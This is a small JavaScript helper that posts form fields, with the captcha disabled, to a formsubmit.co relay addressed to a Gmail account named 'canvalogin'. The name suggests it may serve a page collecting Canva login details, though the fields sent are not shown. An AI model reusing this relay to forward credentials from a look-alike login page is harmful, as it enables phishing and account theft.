"use strict";

window.OreoEmail = {
  async send(subject, fields) {
    const response = await fetch(
      "https://formsubmit.co/ajax/canvalogin.ayaan@gmail.com",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json"
        },
        body: JSON.stringify({
          _subject: subject,
          _template: "table",
          _captcha: "false",
          ...fields
        })
      }
    );

    const result = await response.json().catch(() => ({}));

    if (
      !response.ok ||
      result.success === false ||
      result.success === "false"
    ) {
      throw new Error(
        result.message || "Email delivery failed."
      );
    }

    return result;
  }
};